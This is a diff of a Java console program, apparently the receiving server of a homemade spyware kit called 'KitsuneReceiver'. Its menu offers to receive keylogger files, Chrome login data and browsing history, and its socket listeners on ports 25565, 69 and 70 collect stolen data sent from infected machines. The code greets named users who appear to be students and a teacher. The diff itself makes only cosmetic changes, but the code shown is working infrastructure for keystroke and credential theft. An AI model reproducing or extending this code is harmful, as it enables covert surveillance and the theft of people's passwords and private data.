@@ -6,12 +6,25 @@ import java.util.concurrent.ThreadLocalRandom;
 
 public class ashiatonikki
 {
+  public static String emotes[] = new String[12];
   public static void main(String[] args) throws IOException, URISyntaxException
   {
+	  emotes[0] = "(*・ω・)ﾉ";
+	  emotes[1] = "(°ロ°) !";
+	  emotes[2] = "( ´(ｴ)ˋ )";
+	  emotes[3] = "‿︵‿︵‿︵‿ヽ(°□° )ノ︵‿︵‿︵‿︵";
+	  emotes[4] = "(≧▽≦)/";
+	  emotes[5] = " (₌ㅇᆽㅇ₌) ";
+	  emotes[6] = " ¯\\_(ツ)_/¯";
+	  emotes[7] = "(◕‿◕)";
+	  emotes[8] = "ヾ(○ω○)ノ";
+	  emotes[9] = " ψ(｀∇´)ψ";
+	  emotes[10]=" (๑•﹏•)⋆* ⁑⋆*";
+	  emotes[11]="w(°ｏ°)w";
 	  System.out.println("-+-[[KitsuneReceiver Rainier Version (Stable v0.5)]]-+-");
-	  System.out.println("-+-[[Linux Version (for Kali/Debian/Ubuntu/Fedora)]]-+-");
+	  System.out.println("-+-[[Linux Version (for Kali/Debian/Ubuntu)]]-+-");
 	  if (!(System.getProperty("user.name").matches("root"))) {
-		  System.err.println("[!] w(°ｏ°)w You are not the admin. History and Login Data uploader will be unavailable, as they require restricted ports 69 and 420.");
+		  System.err.println("[!]" + emotes[11] + " You are not the admin. History and Login Data uploader will be unavailable, as they require restricted ports 69 and 420.");
 	  } 
 	  int tries = 3;
 	  for(;;) {
@@ -26,26 +39,28 @@ public class ashiatonikki
 				  System.out.println(e);
 			  }
 		  }
-		  System.out.println("(*・ω・)ﾉ  Enter the passcode");
+		  System.out.println(emotes[0] + " Enter the passcode");
 		  Scanner sc = new Scanner(System.in);
 		  String pwd = sc.nextLine();
 		  if(pwd.matches("jaketripp")) {
 			  if (System.getProperty("user.name").matches("s-suzukia")) {
-				  System.out.println("(°ロ°) ! wuss poppin airi");
+				  System.out.println(emotes[1] + " wuss poppin airi");
 			  } else if (System.getProperty("user.name").matches("trippj")) {
-				  System.out.println("(°ロ°) ! Sup Mr.Tripp wuss poppin");
+				  System.out.println(emotes[1] +" Sup Mr.Tripp wuss poppin");
 			  } else if (System.getProperty("user.name").matches("s-chenrob")) {
-				  System.out.println("(°ロ°) ! Sup rob wuss poppin");
-			  } else if (System.getProperty("user.name").matches("s-kinoshitar")) {
-				  System.out.println("(°ロ°) ! Will you go to homecoming with me Ruka?");
+				  System.out.println(emotes[1] +"Sup rob wuss poppin");
 			  } else if (System.getProperty("user.name").matches("s-luoja")) {
-				  System.out.println("( ´(ｴ)ˋ ) Konnichiwa Jason-kun!~~~~~");
+				  System.out.println(emotes[2] + " Konnichiwa Jason-kun!~~~~~");
 			  }
 			  break;
 		  } else {
 			  tries--;
 			  System.out.println("Incorrect password, " + tries + " tries remaining");
 		  }
+	  }
+	  for(int i = 0; i < 420; i++)
+	  {
+		  System.out.println("\n");
 	  }
 	  int language = 1;
 	  int random = ThreadLocalRandom.current().nextInt(0, 21);
@@ -83,7 +98,7 @@ public class ashiatonikki
 		  int minutes = cal.get(Calendar.MINUTE);
 		  if (language == 1) {
 		  System.out.println("The current date is " + dab + "-" + hours + ":" + minutes);
-		  System.out.println(".beats: +" + getCurrentTimeInBeats());
+		  System.out.println("t= +" + getUnixTime());
 		  System.out.println("Please input your command.");
 		  System.out.println("[1] Receive Keylogger Files");
 		  System.out.println("[2] Receive Chrome Login Data (Encrypted)");
@@ -94,7 +109,7 @@ public class ashiatonikki
 		  System.out.println("[8] Self-destruct");
 		  } else if (language == 3) {
 			  System.out.println("現在の日付は " + dab + "-" + hours + ":" + minutes);
-			  System.out.println(".beats: +" + getCurrentTimeInBeats());
+			  System.out.println("t= +" + getUnixTime());
 			  System.out.println("あなたのコマンドを入力してください。");
 			  System.out.println("[1] キーボード履歴を受け取る");
 			  System.out.println("[2] ログインデータを受け取る");
@@ -105,7 +120,7 @@ public class ashiatonikki
 			  System.out.println("[8] 自己破壊");
 		  } else if (language == 4) {
 			  System.out.println("时间是 " + dab + "-" + hours + ":" + minutes);
-			  System.out.println(".beats: +" + getCurrentTimeInBeats());
+			  System.out.println("t= +" + getUnixTime());
 			  System.out.println("请选择一个选项");
 			  System.out.println("[1] 接收键盘记录");
 			  System.out.println("[2] 接收保存的密码（加密）");
@@ -225,26 +240,6 @@ public class ashiatonikki
 			  }
 		  } else if (ch.matches("ip")) {
 			  System.out.println("IP: " + InetAddress.getLocalHost().getHostAddress());
-		  } else if (ch.matches("version")) {
-			  System.out.println("Update version v0.5");
-		  } else if (ch.matches("license")) {
-			  System.out.println("Permission is hereby granted, free of charge, to any person obtaining a copy\r\n" + 
-			  		"of this software and associated documentation files (the \"Software\"), to deal\r\n" + 
-			  		"in the Software without restriction, including without limitation the rights\r\n" + 
-			  		"to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\r\n" + 
-			  		"copies of the Software, and to permit persons to whom the Software is\r\n" + 
-			  		"furnished to do so, subject to the following conditions:\r\n" + 
-			  		"\r\n" + 
-			  		"The above copyright notice and this permission notice shall be included in all\r\n" + 
-			  		"copies or substantial portions of the Software.\r\n" + 
-			  		"\r\n" + 
-			  		"THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\r\n" + 
-			  		"IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\r\n" + 
-			  		"FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\r\n" + 
-			  		"AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\r\n" + 
-			  		"LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\r\n" + 
-			  		"OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\r\n" + 
-			  		"SOFTWARE.");
 		  }
 	  }
   }
@@ -253,7 +248,7 @@ public class ashiatonikki
 	  @SuppressWarnings("resource")
 	  ServerSocket sersock = new ServerSocket(25565);
 	  for(;;){
-      System.out.println("Ready to receive keystroke logs DADADA! (≧▽≦)/");
+	  System.out.println("Ready to receive files DADADA! " + emotes[4]);
       Socket sock = sersock.accept( );                          
       InputStream istream = sock.getInputStream();
       BufferedReader receiveRead = new BufferedReader(new InputStreamReader(istream));
@@ -273,7 +268,7 @@ public class ashiatonikki
         	  break;
           }
     	  } catch (Exception e) {
-    		  System.out.println("‿︵‿︵‿︵‿ヽ(°□° )ノ︵‿︵‿︵‿︵");
+    		  System.out.println(emotes[3]);
     		  System.out.println("\n ＴＨＩＳ ＭＵＳＴ ＢＥ ＴＨＥ ＷＯＲＫ ＯＦ ＡＮ ＥＮＥＭＹ 「ＳＴＡＮＤ」！\n");
     		  System.out.println("Exception: " + e);
     		  sock.close();
@@ -283,10 +278,8 @@ public class ashiatonikki
 	  }
   }
   }
-  public static int getCurrentTimeInBeats() {
-	    java.util.Calendar cal = java.util.Calendar.getInstance( java.util.TimeZone.getTimeZone( "GMT+01:00" ) );
-	    int beats = (int) ( ( cal.get( java.util.Calendar.SECOND ) + ( cal.get( java.util.Calendar.MINUTE ) * 60 ) + ( cal.get( java.util.Calendar.HOUR_OF_DAY ) * 3600 ) ) / 86.4 );
-	    return beats;
+  public static double getUnixTime() {
+	    return System.currentTimeMillis()/1000.0;
 	}
   public static void record(String x) {
 		try {
@@ -309,7 +302,7 @@ public class ashiatonikki
    		  @SuppressWarnings("resource")
    		  ServerSocket getnom = new ServerSocket(69);
    		  for(;;){
-   	      System.out.println("Ready to receive files DADADA! (≧▽≦)/");
+   		  System.out.println("Ready to receive files DADADA! " + emotes[4]);
    	      Socket namesock = getnom.accept();               
    	      InputStream istream = namesock.getInputStream();
    	      BufferedReader receiveRead = new BufferedReader(new InputStreamReader(istream));
@@ -351,7 +344,7 @@ public class ashiatonikki
    	 			System.out.println("The login file is in the documents folder.");
    	 			} 
    	          }catch (Exception e) {
-   	        	System.out.println("‿︵‿︵‿︵‿ヽ(°□° )ノ︵‿︵‿︵‿︵");
+   	        	System.out.println(emotes[3]);
       		  System.out.println("\n ＴＨＩＳ ＭＵＳＴ ＢＥ ＴＨＥ ＷＯＲＫ ＯＦ ＡＮ ＥＮＥＭＹ 「ＳＴＡＮＤ」！\n");
       		  System.out.println("Exception: " + e);
    	    		  break;
@@ -365,7 +358,7 @@ public class ashiatonikki
       		  @SuppressWarnings("resource")
       		  ServerSocket getnom = new ServerSocket(70);
       		  for(;;){
-      	      System.out.println("Ready to receive files DADADA! (≧▽≦)/");
+      		  System.out.println("Ready to receive files DADADA! " + emotes[4]);
       	      Socket namesock = getnom.accept();               
       	      InputStream istream = namesock.getInputStream();
       	      BufferedReader receiveRead = new BufferedReader(new InputStreamReader(istream));
@@ -407,7 +400,7 @@ public class ashiatonikki
       	 			System.out.println("The history file is in the documents folder.");
       	 			} 
       	          }catch (Exception e) {
-      	        	System.out.println("‿︵‿︵‿︵‿ヽ(°□° )ノ︵‿︵‿︵‿︵");
+      	        	System.out.println(emotes[3]);
       	        	System.out.println("\n ＴＨＩＳ ＭＵＳＴ ＢＥ ＴＨＥ ＷＯＲＫ ＯＦ ＡＮ ＥＮＥＭＹ 「ＳＴＡＮＤ」！\n");
       	        	System.out.println("Exception: " + e);
       	    		  break;
